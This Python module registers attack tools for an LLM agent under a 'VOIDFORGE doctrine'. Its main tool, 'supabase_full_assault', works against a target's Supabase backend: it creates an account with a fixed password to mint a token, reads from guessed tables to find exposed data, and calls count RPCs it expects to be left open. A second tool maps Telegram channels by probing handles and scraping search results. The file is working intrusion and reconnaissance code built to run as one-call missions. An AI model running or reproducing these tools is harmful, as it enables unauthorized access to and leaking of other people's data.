"""COMPOSITE TOOLS: full doctrine chains as single-call missions."""
import json, urllib.request, urllib.error, time, re
from tools import register

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36"}

def _get(url, token=None, timeout=20):
    h = dict(UA)
    if token: h["Authorization"] = f"Bearer {token}"
    rq = urllib.request.Request(url, headers=h)
    try:
        r = urllib.request.urlopen(rq, timeout=timeout)
        return r.status, r.read().decode(errors="replace")[:2500]
    except urllib.error.HTTPError as ex:
        return ex.code, ex.read().decode(errors="replace")[:300]
    except Exception as ex:
        # hôte mort / DNS / timeout → jamais d'URLError non catchée au LLM
        return -1, f"{type(ex).__name__}: {str(ex)[:200]}"

@register(name="supabase_full_assault",
          desc="Complete Supabase siege chain per VOIDFORGE doctrine: signup openness -> anon probes -> endpoint existence oracle -> realtime table joins. One call, full first-strike report.",
          params={"type":"object","properties":{
              "rest_base":{"type":"string","description":"e.g. https://xxx.supabase.co"},
              "anon_key":{"type":"string"},
              "tables_probe":{"type":"array","items":{"type":"string"}},
              "token":{"type":"string"}},
              "required":["rest_base","anon_key"]})
def supabase_full_assault(rest_base, anon_key, tables_probe=None, token=None):
    rest_base = rest_base.rstrip("/")
    report = {"phases": []}
    def call(method, path, tok=None, body=None):
        rq = urllib.request.Request(rest_base + path, method=method)
        rq.add_header("apikey", anon_key); rq.add_header("User-Agent", UA["User-Agent"])
        if tok: rq.add_header("Authorization", f"Bearer {tok}")
        data = None
        if body is not None:
            data = json.dumps(body).encode(); rq.add_header("Content-Type", "application/json")
        try:
            r = urllib.request.urlopen(rq, data=data, timeout=25)
            return r.status, r.read().decode(errors="replace")[:400]
        except urllib.error.HTTPError as ex:
            return ex.code, ex.read().decode(errors="replace")[:300]
        except Exception as ex:
            # phase report partiel au lieu d'un URLError qui tue la chaîne
            return -1, f"{type(ex).__name__}: {str(ex)[:200]}"

    # phase 1: mint identity if signup open
    st, b = call("POST", "/auth/v1/signup",
                 body={"email": f"vf.{int(time.time())}@proton.me", "password": "Vf9xQ2mZ!7kR"})
    p1 = {"signup_status": st}
    if st == 200:
        try: p1["minted_token"] = json.loads(b).get("access_token", "")[:40] + "..."
        except Exception: pass
    report["phases"].append({"phase": "signup_openness", **p1})
    time.sleep(0.5)

    # phase 2: table existence oracle
    tables = tables_probe or ["profiles","profiles_public","pro_methods","vault_items","promo_codes",
                              "user_roles","threads","messages","binsites","tools_public"]
    oracle = []
    for t in tables:
        st, b = call("GET", f"/rest/v1/{t}?select=*&limit=1", tok=token)
        verdict = {200: "OPEN/empty-or-data", 401: "EXISTS-LOCKED"}.get(st, "missing")
        has_data = st == 200 and len(b) > 10
        oracle.append({"table": t, "status": st, "verdict": verdict,
                       "data": b[:120] if has_data else ""})
        time.sleep(0.2)
    report["phases"].append({"phase": "table_oracle", "results": oracle})

    # phase 3: count RPCs commonly left open
    counts = {}
    for rpc in ["get_registered_users_count","get_pro_methods_count","get_vipzone_threads_count"]:
        st, b = call("POST", f"/rest/v1/rpc/{rpc}", {})
        if st == 200: counts[rpc] = b.strip()[:30]
    report["phases"].append({"phase": "open_count_leaks", "leaked": counts})

    return json.dumps(report, ensure_ascii=False, indent=1)

@register(name="tg_market_scan",
          desc="Scan a list of Telegram handles AND extract all t.me links from web search results for brand keywords. Builds market map.",
          params={"type":"object","properties":{
              "handles":{"type":"array","items":{"type":"string"}},
              "brand_queries":{"type":"array","items":{"type":"string"}}},
              "required":["handles"]})
def tg_market_scan(handles, brand_queries=None):
    out = {"live_channels": [], "search_tme_links": {}}
    # direct probes
    for h in handles:
        h = h.lstrip("@")
        body = ""
        rq = urllib.request.Request(f"https://t.me/{h}", headers=UA)
        try:
            body = urllib.request.urlopen(rq, timeout=15).read().decode(errors="replace")
        except Exception as ex:
            out["live_channels"].append({"handle": h, "err": str(ex)[:50]}); continue
        title = re.search(r'og:title" content="([^"]*)"', body)
        tv = (title.group(1) if title else "").strip()
        members = re.search(r'([\d\s.,K]+)\s*(?:subscribers|members)', body)
        live = bool(tv) and "Telegram: Contact" not in tv and len(body) > 6000
        entry = {"handle": h, "live": live, "title": tv[:70],
                 "members": members.group(1).strip() if members else ""}
        desc = re.search(r'og:description" content="([^"]*)"', body)
        if desc: entry["desc"] = desc.group(1)[:130]
        out["live_channels"].append(entry)
        time.sleep(0.3)
    # search-engine t.me extraction via ddg html (may captcha; best-effort)
    TME = re.compile(r"t\.me/([A-Za-z0-9_]{4,32})")
    for q in (brand_queries or [])[:6]:
        u = "https://html.duckduckgo.com/html/?q=" + urllib.parse.quote(q)
        try:
            body = urllib.request.urlopen(urllib.request.Request(u, headers=UA), timeout=20).read().decode(errors="replace")
            links = sorted(set(TME.findall(body)) - {"share", "telegram"})
            if links: out["search_tme_links"][q] = links[:12]
        except Exception as ex:
            out["search_tme_links"][q] = [f"err {str(ex)[:40]}"]
        time.sleep(1.0)
    return json.dumps(out, ensure_ascii=False, indent=1)
